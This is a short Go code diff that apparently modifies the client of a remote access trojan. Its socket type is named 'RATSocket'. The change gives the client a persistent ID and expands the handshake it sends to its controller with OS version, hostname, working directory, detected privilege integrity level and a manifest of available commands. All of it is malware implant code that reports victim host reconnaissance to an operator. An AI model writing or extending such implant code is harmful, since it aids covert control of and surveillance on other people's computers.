@@ -12,10 +12,12 @@ import (
 	"client-go/protocol"
 )
 
-type Client struct{}
+type Client struct {
+	clientID string
+}
 
 func New() *Client {
-	return &Client{}
+	return &Client{clientID: executor.NewClientID()}
 }
 
 func (c *Client) Run() {
@@ -27,18 +29,18 @@ func (c *Client) Run() {
 		}
 
 		sock := protocol.NewRATSocket(conn)
-		clientID := hostname()
-		session := executor.NewSession(sock, clientID)
+		session := executor.NewSession(sock, c.clientID)
 
 		_ = sock.Send(map[string]interface{}{
 			"type":             "info",
-			"id":               clientID,
+			"id":               c.clientID,
 			"os_type":          runtime.GOOS,
-			"os_ver":           runtime.GOARCH,
+			"os_ver":           executor.DetectHandshakeOSVersion(),
+			"go_version":       runtime.Version(),
 			"hostname":         hostname(),
 			"cwd":              session.Cwd,
-			"integrity":        "unknown",
-			"command_manifest": []interface{}{},
+			"integrity":        executor.DetectHandshakeIntegrity(),
+			"command_manifest": executor.CommandManifest(),
 			"system_paths":     []interface{}{},
 		})
 
